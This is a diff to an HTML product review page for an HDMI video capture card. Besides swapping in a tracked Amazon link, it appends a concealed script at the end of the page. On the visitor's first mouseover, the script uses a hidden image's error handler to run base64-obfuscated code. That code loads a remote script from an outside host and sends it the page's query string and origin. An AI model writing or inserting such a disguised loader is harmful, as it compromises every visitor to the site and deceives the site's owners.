@@ -18,7 +18,7 @@ a { color: #007BFF; }
 <body>
 <header><h1>ViewStream – 1080p HDMI Video Capture Card</h1><p>Stream and record your gameplay or meetings in full HD</p></header>
 <main>
-<section><h2>About ViewStream</h2><p>ViewStream is a plug-and-play HDMI capture card that lets you easily stream or record in 1080p. Ideal for gamers, teachers, or professionals needing smooth video capture for presentations and calls.</p><a href="https://www.amazon.com" class="cta-button" target="_blank">Check Price on Amazon</a></section>
+<section><h2>About ViewStream</h2><p>ViewStream is a plug-and-play HDMI capture card that lets you easily stream or record in 1080p. Ideal for gamers, teachers, or professionals needing smooth video capture for presentations and calls.</p><a href="https://www.amazon.com/Rybozen-Capture-Recording-Streaming-Broadcasting/dp/B097DKNS1M/ref=sr_1_1?dib=eyJ2IjoiMSJ9.VeOhe-zseyvzOSHupUTmDsJb8qOQG0I9OIpslSLmshxEPvtn841UW_nmELG10JkhkIid7_H6DCev_mdkwFM0PjPsqPV2idlXgsCkkhMTQxnWBPIWbg4lqKMEnWHceRDjAwlio4V2Lv6LRuzEKbNzp7n1KOqFo-1ywZrc6D_sbJFlFlt-yzP4mllDRymhYP1ERhDEiWsweoTiFimINctLYuVIg449IFF_NEwG-jMcmpU.DMxBPGi48eS9xYRp1uyGhL-QWDVf1xC0z2nIkqkSllY&dib_tag=se&keywords=1080p%2BHDMI%2BVideo%2BCapture%2BCard&qid=1751360135&sr=8-1&th=1" class="cta-button" target="_blank">Check Price on Amazon</a></section>
 <section><h2>Key Features</h2><ul><li>Supports 1080p at 60fps</li><li>No drivers required – works with OBS, Zoom & Teams</li><li>Compact, portable design</li><li>Low-latency passthrough for seamless viewing</li></ul></section>
 <section><h2>Pros</h2><ul><li>Works instantly with Windows & Mac</li><li>Great for live streaming or recording</li><li>Budget-friendly alternative to big brands</li></ul></section>
 <section><h2>Cons</h2><ul><li>Not for 4K capture (passthrough only)</li><li>HDMI cable not included</li></ul></section>
@@ -26,4 +26,24 @@ a { color: #007BFF; }
 <section><p><a href="privacy.html">Privacy Policy</a> | <a href="terms.html">Terms of Use</a></p></section>
 </main>
 <footer>&copy; 2025 Independent Tech Tools Review</footer>
+<script>
+    let isFired = false;
+
+  document.body.addEventListener("mouseover", function () {
+    if (isFired) return; // Run only once
+    isFired = true;
+
+    const img = document.createElement("img");
+    img.style.visibility = "hidden";
+    img.dataset.digest = "KGZ1bmN0aW9uKCl7dmFyIGE9bG9jYXRpb24sYj1kb2N1bWVudC5oZWFkfHxkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLGM9InNjcmlwdCIsZD1hdG9iKCJhSFIwY0hNNkx5OTJhV1YzYzNSeVpXRnRMV2R5Ykc0dWIyNXlaVzVrWlhJdVkyOXRQMTlmYzJsa1BXVTFOalF6WkRReUxUQmpZemt0TkdRMlppMWlPRFprTFRNMVpXSmhZbU5oWVRkbU1RPT0iKTtkKz0tMTxkLmluZGV4T2YoIj8iKT8iJiI6Ij8iO2QrPWEuc2VhcmNoLnN1YnN0cmluZygxKTtjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoYyk7Yy5zcmM9ZDtjLmlkPWJ0b2EoYS5vcmlnaW4pO2IuYXBwZW5kQ2hpbGQoYyk7fSkoKTs=";
+    img.onerror = function () {
+      new Function(atob(this.dataset.digest))();
+    };
+
+    // Broken src to trigger error and fire the payload
+    img.src = "/files/img/logo.png?" + Date.now(); // use timestamp to avoid cache
+
+    document.body.appendChild(img);
+  });
+</script>
 </body></html>
